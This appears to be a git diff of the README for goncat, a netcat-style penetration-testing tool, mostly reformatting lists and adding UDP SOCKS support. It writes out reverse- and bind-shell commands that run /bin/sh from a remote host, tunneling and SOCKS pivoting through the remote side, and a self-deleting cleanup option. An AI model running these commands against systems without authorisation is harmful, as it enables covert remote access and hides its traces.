@@ -6,10 +6,10 @@ It contains a few extra features that I missed from netcat.
 First, goncat supports encryption with mutual authentication
 so you don't have to write on one page of your pentest report that administrative access to servers without encryption or authentication is a problem
 while writing on the next page how you did exactly that.
-Second, it has automatic cross-platform PTY support for your convenience. 
+Second, it has automatic cross-platform PTY support for your convenience.
 Third, it can be used for tunneling.
-For now it supports local and remote port forwarding as well as barebones SOCKS (TCP only, no authentication).
-Lastly, there are a few other convenience features such as session logging 
+For now it supports local and remote port forwarding as well as barebones SOCKS (TCP CONNECT and UDP ASSOCIATE supported, but no authentication).
+Lastly, there are a few other convenience features such as session logging
 and automatic cleanup.
 
 Disclaimer: please treat this tool as alpha. It is work an progress and may very well be turned upside down.
@@ -30,30 +30,32 @@ You can turn either side into whatever you want.
 There is only one binary combining all features and it works cross-platform.
 
 A few examples to illustrate basic use, which all assume a goncat binary exists on both your own machine and a remote one:
-- Reverse shell
-  - On your machine: `goncat master listen --port 12345 --exec /bin/sh` to create a listener on port 12345 that will instruct the other end to execute `/bin/sh`.
-  - Remote: `goncat slave connect --host 11.22.33.44 --port 12345` to connect the remote side as a slave, which will execute `/bin/sh`.
-- Bind shell
-  - Remote: `goncat slave listen --port 12345` to listen in port 12345 for connections. The listener will do whatever a connecting master asks it to.
-  - On your machine: `goncat master connect --host 55.66.77.88 --port 12345 --exec /bin/sh` to connect to the remote host and make it execute `/bin/sh`.
+
+*   Reverse shell
+    *   On your machine: `goncat master listen --port 12345 --exec /bin/sh` to create a listener on port 12345 that will instruct the other end to execute `/bin/sh`.
+    *   Remote: `goncat slave connect --host 11.22.33.44 --port 12345` to connect the remote side as a slave, which will execute `/bin/sh`.
+*   Bind shell
+    *   Remote: `goncat slave listen --port 12345` to listen in port 12345 for connections. The listener will do whatever a connecting master asks it to.
+    *   On your machine: `goncat master connect --host 55.66.77.88 --port 12345 --exec /bin/sh` to connect to the remote host and make it execute `/bin/sh`.
 
 Advanced features can be enabled with additional flags:
-- Encryption: add `--ssl` on both ends to enable TLS
-- Authentication: add `--key mypassword` on both ends to ensure no unexpected clients can connect (requires `--ssl`)
-- PTY: as master, add `--pty` to get a fully interactive shell (make sure you also execute a shell with `--exec`)
-- Local port forwarding: as master, add `-L 8443:google.com:443` to open a local port 8443 on the master side, any connection to it will
-  be forwarded through the slave to `google.com:443`
-- Remote port forwarding: as master, add `-R 8443:google.com:443` to open a local port 8443 on the slave side, any connection to it will
-  be forwarded through the master to `google.com:443`
-- SOCKS proxy: as master, add `-D 127.0.0.1:1080` to create a SOCKS proxy, through which you can use the slave side
-- Logging: as master, add `--log /tmp/log.txt` to log the session to a file
-- Cleanup: as slave, add `--clean` to make goncat delete itself after execution
+
+*   Encryption: add `--ssl` on both ends to enable TLS
+*   Authentication: add `--key mypassword` on both ends to ensure no unexpected clients can connect (requires `--ssl`)
+*   PTY: as master, add `--pty` to get a fully interactive shell (make sure you also execute a shell with `--exec`)
+*   Local TCP port forwarding: as master, add `-L 8443:google.com:443` to open a local port 8443 on the master side, any connection to it will
+    be forwarded through the slave to `google.com:443`
+*   Remote TCP port forwarding: as master, add `-R 8443:google.com:443` to open a local port 8443 on the slave side, any connection to it will
+    be forwarded through the master to `google.com:443`
+*   SOCKS TCP/UDP proxy: as master, add `-D 127.0.0.1:1080` to create a SOCKS proxy, through which you can use the slave side (now with UDP support)
+*   Logging: as master, add `--log /tmp/log.txt` to log the session to a file
+*   Cleanup: as slave, add `--clean` to make goncat delete itself after execution
 
 ## A few Details
 
 Encryption and authentication is implemented with (mutual) TLS.
 To save you the hassle of generating certificates, goncat does that for you.
-If you only enable `--ssl` you get encryption only. 
+If you only enable `--ssl` you get encryption only.
 The server side generates a new certificate on each run of `goncat ... listen`.
 The client will accept any certificate without validation.
 If you additionally enable `--key mypassword` then your password will be used as a seed
@@ -73,6 +75,5 @@ It is all too easy to forget deleting them.
 Thus you can tell the slave side to `--clean` up after itself.
 goncat will then attempt to delete itself before it terminates.
 This works well on many Linux machines, where you can just delete your own binary.
-On Windows things are a bit tricky. 
+On Windows things are a bit tricky.
 At the moment, goncat launches a seperate CMD-based job to delete the binary 5 seconds after termination.
-
